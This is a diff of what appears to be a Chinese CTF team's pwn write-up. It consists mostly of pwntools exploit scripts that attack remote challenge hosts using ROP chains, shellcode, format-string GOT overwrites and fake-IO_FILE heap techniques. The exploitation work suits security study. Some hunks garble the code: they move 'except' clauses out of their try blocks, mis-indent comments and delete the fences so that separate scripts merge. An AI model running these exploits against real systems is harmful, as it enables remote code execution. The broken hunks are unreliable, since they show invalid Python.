@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-线上： 
+线上：
 
 asm
 
@@ -47,13 +47,13 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
+#libc=ELF('libc-2.23.so')
+#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
 #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 #p=remote('101.200.58.4',10001)
@@ -71,7 +71,7 @@ payload=p64(0x40103D)+p64(0x401034)+p64(0x401030)+p64(0x401034)+p64(0x401030)+p6
 bug()
 s(payload)
 
-inter()	
+inter()
 
 ret
 
@@ -113,13 +113,13 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
+#libc=ELF('libc-2.23.so')
+#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
 #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('101.200.58.4',10004)
@@ -140,7 +140,7 @@ payload=shellcode.ljust(0x88,b'x00')+p64(stack)
 
 s(payload)
 
-inter()	
+inter()
 
 normal pwn
 
@@ -290,13 +290,13 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6') 
+libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6')
 #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
+#libc=ELF('libc-2.23.so')
+#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
 #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('101.200.58.4',2222)
@@ -346,9 +346,9 @@ add_chunk(12,0x560)
 edit_chunk(12,p64(0x4010a6)*4+p64(0x4011D6))
 rl(b'>')
 sl(str(1))
-inter()	
+inter()
 
- 线下： 
+ 线下：
 
 skill
 
@@ -864,10 +864,12 @@ while true:
             exp()  # 调用成功后的操作
             break  # 跳出循环
 
-    except EOFError:
+    
+except EOFError:
         print("Process ended unexpectedly.")  # 捕获进程意外结束的情况
         break  # 跳出循环
-    except Exception as e:
+    
+except Exception as e:
         print(f"An error occurred: {e}")  # 捕获其他异常并打印错误信息
         p.close()  # 确保在发生错误时关闭进程
         break  # 跳出循环
@@ -1070,7 +1072,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1087,16 +1089,16 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so')
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#p=remote('101.200.58.4',10001)
+    #p=remote('101.200.58.4',10001)
 p=process('./pwn')
 bin_sh=0x40200A
 rl(b'Hello Pwn')
@@ -1112,11 +1114,6 @@ bug()
 s(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -1134,7 +1131,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1151,20 +1148,20 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so')
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('101.200.58.4',10004)
-#p = process('./pwn')
+    #p = process('./pwn')
 
-#gdb.attach(p, 'b *0x40085E')
-#pause()
+    #gdb.attach(p, 'b *0x40085E')
+    #pause()
 rl("hello,What do you want to ask?")
 payload=b'%8$p'
 
@@ -1179,11 +1176,6 @@ payload=shellcode.ljust(0x88,b'x00')+p64(stack)
 s(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -1201,7 +1193,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1219,16 +1211,16 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
-#context(os='linux',arch='amd64',log_level='debug')
+    #context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='amd64',log_level='debug')
 context(log_level='debug',arch='aarch64',os='linux')  
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 io = remote('101.200.58.4',5555)
-#p = process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu","-g", "1234", "./pwn"])
+    #p = process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu","-g", "1234", "./pwn"])
 elf = ELF('./pwn')
 
 def bug():
@@ -1277,11 +1269,6 @@ edit(0,b'%3392c%55$hn')
 puts(0)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -1299,7 +1286,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1316,17 +1303,17 @@ def get_hook():
 pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6')
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so')
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('101.200.58.4',2222)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add_chunk(i,size):
  sla(b'>',str(1))
@@ -1373,11 +1360,6 @@ edit_chunk(12,p64(0x4010a6)*4+p64(0x4011D6))
 rl(b'>')
 sl(str(1))
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -1396,7 +1378,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1414,17 +1396,17 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
-#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('3.1.30.5',9999)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add(con):
  rl("5. exit")
@@ -1462,15 +1444,10 @@ payload=b'a'*(0x10+8)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
 sl(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
  gdb.attach(p)
@@ -1485,7 +1462,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1503,22 +1480,22 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('3.1.30.8',9999)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rl("Please enter your name")
 
 payload=b'%9$p%6$p'
-#bug()
+    #bug()
 s(payload)
 rl(b'0x')
 libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
@@ -1542,7 +1519,7 @@ s(p64(0x4010D0))
 rl("Please enter your name")
 
 payload=b'%9$p%6$p'
-#bug()
+    #bug()
 s(payload)
 rl(b'0x')
 libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
@@ -1566,15 +1543,10 @@ s(p64(system))
 rl("Please enter your name")
 sl(b'$0x00')
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
  gdb.attach(p)
@@ -1589,7 +1561,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1607,21 +1579,21 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#p=remote('',)
+    #p=remote('',)
 p = process('./pwn')
 rl("Please enter your name")
 
 payload=b'%9$p'
-#bug()
+    #bug()
 s(payload)
 rl(b'0x')
 libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
@@ -1632,43 +1604,38 @@ rdi=0x0000000000401363
 rl("Come and try it out")
 
 payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
-#bug()
+    #bug()
 s(payload)
 rl("Congratulations on completing a big step")
 s(p64(elf.got['exit']))
-#pause()
+    #pause()
 s(p64(0x4010D0))
 
 rl("Please enter your name")
 
 payload=b'aaa'
-#bug()
+    #bug()
 s(payload)
 
 rdi=0x0000000000401363
 rl("Come and try it out")
 
 payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
-#bug()
+    #bug()
 s(payload)
 rl("Congratulations on completing a big step")
 s(p64(elf.got['printf']))
-#pause()
+    #pause()
 s(p64(system))
 
 rl("Please enter your name")
 sl(b'$0x00')
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
  gdb.attach(p)
@@ -1683,7 +1650,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1701,16 +1668,16 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#p=remote('3.1.30.6',9999)
+    #p=remote('3.1.30.6',9999)
 rdi=0x00000000004015c3
 def exp():
  sleep(0.1)
@@ -1794,13 +1761,13 @@ rl("Your password: ")
 s(b'a'*(0x10))
 
 rl("give me a length: ")
-#bug()
+    #bug()
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
-#bug()
+    #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
@@ -1824,13 +1791,13 @@ system,bin_sh=get_sb()
 pr(hex(system))
 pr(hex(bin_sh))
 rl("give me a length: ")
-#bug()
+    #bug()
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
-#bug()
+    #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
@@ -1848,12 +1815,7 @@ rl(b': ')
 sl(str(system))
 '''
 
-#inter()
-```
-
-
-
-```
+    #inter()
 true = 1
 while true:
     try:
@@ -1876,18 +1838,15 @@ while true:
             exp()  # 调用成功后的操作
             break  # 跳出循环
 
-    except EOFError:
+    
+except EOFError:
         print("Process ended unexpectedly.")  # 捕获进程意外结束的情况
         break  # 跳出循环
-    except Exception as e:
+    
+except Exception as e:
         print(f"An error occurred: {e}")  # 捕获其他异常并打印错误信息
         p.close()  # 确保在发生错误时关闭进程
         break  # 跳出循环
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -1906,7 +1865,7 @@ def sla(a,b):
  p.sendlineafter(a,b)
 def r(a):
  p.recv(a)
-#def pr(a):
+    #def pr(a):
  #print(p.recv(a))
 def rl(a):
  return p.recvuntil(a)
@@ -1924,16 +1883,16 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#p=remote('',)
+    #p=remote('',)
 p = process('./pwn')
 
 def add1(size):
@@ -2008,7 +1967,7 @@ add3(0x4ff)
 fake_io_addr=heap_base+0x3a0 # 伪造的fake_IO结构体的地址
 
 next_chain = 0
-#fake_IO_FILE=p64(rdi)         #_flags=rdi
+    #fake_IO_FILE=p64(rdi)         #_flags=rdi
 fake_IO_FILE =p64(0)*6
 fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
 fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
@@ -2037,7 +1996,7 @@ free(6)
 edit(4,p64(libc_base+43249385440)*2+p64(heap_base+0x870)+p64(heap_base-336-0x20))
 add3(0x4ff)
 
-#bug()
+    #bug()
 rl(">> ")
 sl(str(5))
 
